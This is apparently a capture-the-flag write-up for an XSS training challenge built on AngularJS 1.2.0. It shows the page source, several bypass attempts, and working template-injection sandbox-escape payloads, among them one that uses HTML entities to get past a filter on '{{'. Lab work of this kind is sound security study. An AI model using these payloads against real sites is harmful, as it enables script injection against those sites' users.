# **XSSGame Level 6**

![](https://i.imgur.com/awndSth.png)

```shell=
<!DOCTYPE html>
<html>
  <head>
    <title>Foogle</title>
    <style>
      body {
        background-color: #ffffff;
      }
    </style>
    <script src="/static/js/js_frame.js"></script>
    <script src="//ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js"></script>
    <script>
      angular.module('myApp', [])
      .controller('myController', ['$scope', function ($scope) {
        $scope.query = "";
        $scope.alert = window.alert;
      }]);
    </script>
  </head>
  <body ng-app="myApp">
    <div ng-controller="myController">
      <center>
        <img src="/static/img/foogle.png">
        <br>
        <form action="/f/rWKWwJGnAeyi/" method="POST">
          <input id="demo2-query" name="query" maxlength="140" ng-model="query" placeholder="Enter query here...">
          <input id="demo2-button" type="submit" value="Search">
        </form>
        <p>You have {{140 - query.length}} characters left.</p>

        
        
      </center>
    </div>
  </body>
</html>
```

No more form attributes this time.

Then we simply try `{{alert()}}`

`<p ng-non-bindable>Sorry, no results were found for <b>{{alert()}}</b>.</p>`

`<p ng-non-bindable>` means this output will not be compiled by Angular.

Then I try `?query=alert()}}` in URL, I got :

```
<form action="/f/rWKWwJGnAeyi/?query=alert()}}" method="POST">
    <input id="demo2-query" name="query" maxlength="140" ng-model="query" placeholder="Enter query here...">
    <input id="demo2-button" type="submit" value="Search">
</form>
```

You'll see in Search Bar, it's `POST`, however, reflective XSS will not work with `ng-non-bindable` tag, and in `GET`, the query will show in form's `action` attribute.

Cause to the challenges name : `Angular 2`, let's try to dif() two source code, then we got something suspicious:


```shell=
#Angular
<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.5.8/angular.min.js"></script>
#Angular 2
<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js"></script>
```

Quickly search `angularjs 1.2.0 xss`, then you'll see the XSS payload like following:

```shell=
?query={{'a'.constructor.prototype.charAt=[].join;
eval('x=1} } };alert(1)//');}}
```

Well, something still wrong though.

```shell=
<form action="/f/rWKWwJGnAeyi/?query='a'.constructor.prototype.charAt=[].join; eval('x=1} } };alert(1)//');}}" method="POST">
```
`{{` seems been replaced as `NULL`, let's find the way to bypass it like URL encoded?

Let's replace `{` to `&lcub`.

```shell=
?query=&lcub;&lcub;a='constructor';b=&lcub;&rcub;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert()')()}}
```

![](https://i.imgur.com/YXWRMu5.png)
